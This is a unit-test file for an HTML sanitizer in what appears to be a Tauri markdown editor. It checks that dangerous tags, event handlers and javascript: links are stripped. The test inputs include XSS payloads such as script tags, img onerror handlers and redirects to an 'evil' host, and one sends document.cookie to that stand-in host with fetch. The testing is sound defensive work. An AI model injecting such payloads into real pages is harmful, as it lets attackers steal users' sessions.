/**
 * sanitizeHtml / safeRender 单元测试（对应 C-01 Critical 与 M-04 Major）
 *
 * 验证所有注入 DOM 的 HTML 都经过白名单清洗：
 *  - 脚本 / 事件处理器 / 危险标签被剥离
 *  - javascript: 协议被中和
 *  - 外链自动加 target=_blank rel=noopener（防 opener 劫持）
 *  - 非任务列表 <input> 降级为禁用复选框
 *  - Tauri asset:// 资源协议被保留（本地图片预览依赖）
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml, safeRender, type RenderLike } from "../sanitize";

// 一个最小「渲染器」：把输入原样当 HTML 返回，便于隔离测试清洗层本身
const echo: RenderLike = { render: (s) => s };

describe("C-01 脚本与危险标签拦截", () => {
  it("剥离 <script>", () => {
    const out = sanitizeHtml("<p>hi</p><script>alert(1)</script>");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert(1)");
  });

  it("剥离 <iframe>", () => {
    const out = sanitizeHtml('<iframe src="javascript:alert(1)"></iframe>');
    expect(out).not.toContain("<iframe");
  });

  it("剥离 <style>（防止 CSS 外链泄漏）", () => {
    const out = sanitizeHtml("<style>body{background:url(http://evil/x)}</style><p>ok</p>");
    expect(out).not.toContain("<style");
  });

  it("剥离 <form>/<button> 等诱导交互面", () => {
    const out = sanitizeHtml('<form action="//evil"><button>x</button></form>');
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<button");
  });

  it("剥离 <object>/<embed>/<link>/<base>/<meta>", () => {
    for (const tag of [
      '<object data="x"></object>',
      '<embed src="x">',
      '<link rel="stylesheet" href="//evil">',
      "<base href=\"//evil\">",
      '<meta http-equiv="refresh" content="0;url=//evil">',
    ]) {
      const out = sanitizeHtml(tag);
      expect(out.toLowerCase()).not.toContain(tag.split(" ")[0].slice(0, 6));
    }
  });
});

describe("C-01 事件处理器与危险协议中和", () => {
  it("剥离 <img onerror>", () => {
    const out = sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
  });

  it("中和 javascript: 链接", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain("javascript:alert");
  });

  it("保留合法 https 链接", () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toContain('href="https://example.com"');
  });
});

describe("C-01 外链加安全属性（防 window.opener 劫持）", () => {
  it("外链自动加 target=_blank rel=noopener noreferrer", () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer"');
  });

  it("内链（相对路径）不加 target", () => {
    const out = sanitizeHtml('<a href="local.md">local</a>');
    expect(out).not.toContain('target="_blank"');
    expect(out).toContain('href="local.md"');
  });
});

describe("C-01/M-04 任务列表 input 降级", () => {
  it("非任务列表 <input type=text> 降级为禁用复选框", () => {
    const out = sanitizeHtml('<input type="text" name="x">');
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).not.toContain('type="text"');
  });

  it("任务列表复选框（checked）保留为禁用 checkbox", () => {
    const out = sanitizeHtml('<input type="checkbox" checked>');
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).toContain("checked");
  });
});

describe("C-01 Tauri 资源协议放行（本地图片预览依赖）", () => {
  it("asset://localhost 图片地址被保留", () => {
    const out = sanitizeHtml('<img src="asset://localhost/foo.png" alt="x">');
    expect(out).toContain("asset://localhost/foo.png");
  });

  it("tauri:// 协议被保留", () => {
    const out = sanitizeHtml('<img src="tauri://asset/foo.png">');
    expect(out).toContain("tauri://asset/foo.png");
  });
});

describe("safeRender 组合渲染+清洗", () => {
  it("渲染输出中的脚本被清洗", () => {
    const out = safeRender(echo, "<div><script>steal()</script>ok</div>");
    expect(out).not.toContain("<script");
    expect(out).toContain("ok");
  });

  it("空输入返回空字符串（不抛错）", () => {
    expect(sanitizeHtml("")).toBe("");
  });
});

describe("M-04 原始 HTML 无法持久化为可执行脚本", () => {
  it("contenteditable 可能粘入的内联样式标签被剥离，XSS 向量消除", () => {
    // 模拟预览编辑模式粘入 `<img onerror>` 再落盘；再次渲染时不应执行
    const injected = '<p>a</p><img src=x onerror="fetch(\'//evil?\'+document.cookie)">';
    const out = sanitizeHtml(injected);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("fetch");
  });
});
